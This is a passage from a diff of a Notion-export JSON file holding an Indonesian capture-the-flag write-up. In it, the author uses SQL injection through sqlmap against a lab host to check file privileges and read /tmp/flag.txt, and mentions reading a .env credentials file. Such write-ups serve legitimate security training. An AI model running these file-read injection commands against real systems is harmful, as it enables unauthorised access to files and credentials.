+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-817d-bec3-cfb06fdd400b",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-817a-8511-f62b93e5cfd3",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Oke berarti tinggal akses aja flag yang ada di tmp. Tapi disini, saya udah coba melakukan RCE pada app debug itu, namun masih belum bisa. Disini sepertinya itu rabbit hole. Jadi fokus kembali ke SQL Injection. Nah di sqlinjection juga bisa mengakses file yang ada target. Sebelum itu, harus cek dulu permission nya",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-813f-93ee-d64ff7aa6b06",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "sqlmap -u \"http://10.10.0.127/api/users/?id=231\" -p id --sql-query=\"SELECT @@secure_file_priv\"",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-81ea-9a00-c95b3410a018",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-19.png",
+          "expiry_time": "2025-09-18T02:37:21.314Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-19.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/91f8edb4-e1e6-4c5a-acf6-6556d0847af3/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=97d2ae2150c5095d72bea36688bc4dde385bdfd3345013db8365feb53dff04aa&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8165-9ce3-cefb3efffb39",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8150-83b6-c49944f8998f",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Mantap 😄, bisa dilihat pada gambar diatas bahwa  ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "secure_file_priv",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " = ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "''",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": true,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " artinya ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": "bisa baca file dari path mana pun",
+              "annotations": {
+                "bold": true,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            },
+            {
+              "content": " via SQLi. Namun di hint hanya ada file flag di /tmp/ saja, tidak disebutkan juga file nya. Tetapi saya disini langsung tebak saja yang kemungkinan file flag nya adalah flag.txt. Berikut command nya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81f4-996d-cadd3d67dd82",
+        "type": "code",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "sqlmap -u \"http://10.10.0.127/api/users/?id=231\" -p id --file-read=\"/tmp/flag.txt\"",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "language": "bash",
+          "caption": []
+        }
+      },
+      {
+        "id": "266db469-a81d-81a5-9f20-d125fe27b32e",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81e1-a3a4-f5e0b09745cd",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-20.png",
+          "expiry_time": "2025-09-18T02:37:21.321Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-20.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/87b129b1-97ab-4d25-aaf7-4b4b2107b24f/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=f0e7a1814ed67a3bb9300f4476761b40dd2b2a808b9250edad69c3b239235a8a&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8168-8666-d2e5b42f32ec",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8149-9347-dfeab3847ce4",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Dan yups 😄 file flag.txt berhasil ditemukan, dan kita simpan ke file system kita. Langsung saja kita cek:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81d8-b341-c8694be11937",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8139-aa91-e209ef8b827d",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-21.png",
+          "expiry_time": "2025-09-18T02:37:21.311Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-21.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/b7f07d52-e5f4-45ce-9d7d-8b638f2058e2/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=a052e2c1d32685db647d3b5d5dee3807f89620614ab49f03bd27acf817f94a49&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-81bc-9f62-ff2e8005a08e",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "\nEits disini saya ga langsung submit dulu, saya cek dulu apakah ada flag lagi ? saya coba cek di credential .env, dan berikut hasilnya:",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81dd-817f-c8c935f904f5",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-22.png",
+          "expiry_time": "2025-09-18T02:37:21.316Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-22.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/aae3c3c7-af06-46cb-a951-2e0caa2cabb0/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=ce8ac16ae6332a1879cc16842f348ac5a20e2ac5a5b59e53f7f6bd4d35a18cb3&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-816d-8e78-da7451483a28",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8143-914e-cbf84a56b22c",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "[bonus]",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81a7-9d08-c07ea0e7d447",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [
+            {
+              "content": "Terlihat di DB_USERNAME nya sepertinya itu flag root karna DB_PASSWORD nya juga root 😃. Tapi setelah dicek ternyat itu flag #2 yang kita submit huhu wkwk ",
+              "annotations": {
+                "bold": false,
+                "italic": false,
+                "strikethrough": false,
+                "underline": false,
+                "code": false,
+                "color": "default"
+              },
+              "href": null
+            }
+          ],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8113-a78d-f7d791c1de53",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-815b-9202-c909c27a2458",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-23.png",
+          "expiry_time": "2025-09-18T02:37:21.323Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-23.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/5d6058b9-ce81-4a29-9b79-a625c0eba1e6/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=05f64ac3b0e97d7d5a08b5dd0bb32ab69b3f316253571a1c4e5b438a62c42c00&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8101-9402-c51768111deb",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-81d4-a9fc-c0b77752cc8a",
+        "type": "image",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "caption": [],
+          "type": "file",
+          "url": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-24.png",
+          "expiry_time": "2025-09-18T02:37:21.347Z",
+          "localUrl": "/posts/ctf-cyberacademy-belati-kasar-266db469a81d8058ae73c71c8b850c3f/image-24.png",
+          "originalUrl": "https://prod-files-secure.s3.us-west-2.amazonaws.com/25667693-cef6-45e6-a695-79b59f50105b/91ad213d-aaeb-4e85-ab36-40ba3ed6228c/image.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=ASIAZI2LB4666BCWV4IQ%2F20250918%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250918T013721Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDgaCXVzLXdlc3QtMiJGMEQCIEV%2BBM%2B5ZvK25fOC1OkhXgLV2F%2FQqedrLZLnZkIMX1LCAiATn5aVIduzpEGE4Bnif%2BC8dfOZN4YeZhkg4korOto8DyqIBAix%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAAaDDYzNzQyMzE4MzgwNSIM1fuYDutiP%2BGE%2FmuZKtwDgjMtD2p3bpVZ2kCf48DJzd5uGUOerUe7g83yl7QmmaGDluoEHVpIopU9naOGrabO8V39H5li9ULF9tGL5hiaMwNw6VpANKdGYANXA8lupCv8VbCzVB7fiQW8VSLuyzA9d33j7AkhnxVaEcMm8F%2BMkmX8GdaLgj5BNs4IuXONOK1wU1QMo5WGmkL22JbaYb692fYGGkSszJRqhsh0iRg5Z01Mr3Jdx7zy9vEBxoPKowQE2q7ECkJyXtWy2Zc7sEisD2H5%2FHzCkA%2FFlPaEq4ToqH%2BhyYM0EikeRw9nXqCMtyx5vsiby%2Bk8gNgtPY%2FD1Kzw86LBIG21K4aUQ31zPCBteO8MSAwQVquW%2Bk4vUZgvm5Y24gU5hYyX1BNEZiHcHObMJuocvccPFx88L0MWOqBWEeHxE39oMS2XFIVcym0%2FQA97MRaU%2BeEi3Jz1iqcKYojksM%2B46BaUSYkRhsWnInUoYoZkwJ3BgOvwGL9yjcGBZVLYQuPukr3VHB9DykUKjw2xolCrNPXYVxb2Hp1hCdO8aEVmznZ5Usm34xChBpvvQrbRjqS76ewe2gNoWlLvCOSkeNRzndA8KOl1uNDTi30aTGQXNJduB0OZ1ot0nCivNvEeJxNGEn0EUFj0mVswp5itxgY6pgFEnZBOOQYi288LG4ddZlOlxtAbFyP266M2g%2BX2z2RaWW7rLuC%2FhYH91M%2Fe6lqrokGU9CkOUA8LI%2BJOf%2F4Rg5cuuJehssopTh0YuyuY915cs8lexHwsfWsh0OLQidY1cWPmwGD49If7ek5YxViPTHB%2BTJEtARKAeh0vZ4KGXPfa7XaT3dY%2F8PMzacvy8kPJ8KZJdI8VpQjyZx1ZCJQXbt2Glw1v0gH9&X-Amz-Signature=f10a6601d94ea35b625bda5066cf1b6770fde09080d090c3e5d417de787809e8&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject"
+        }
+      },
+      {
+        "id": "266db469-a81d-8130-a80f-c3ac9f88b39e",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
+        "archived": false,
+        "content": {
+          "rich_text": [],
+          "color": "default"
+        }
+      },
+      {
+        "id": "266db469-a81d-8158-a861-e9bbfe7eb3fd",
+        "type": "paragraph",
+        "created_time": "2025-09-06T10:11:00.000Z",
+        "last_edited_time": "2025-09-06T10:11:00.000Z",
+        "has_children": false,
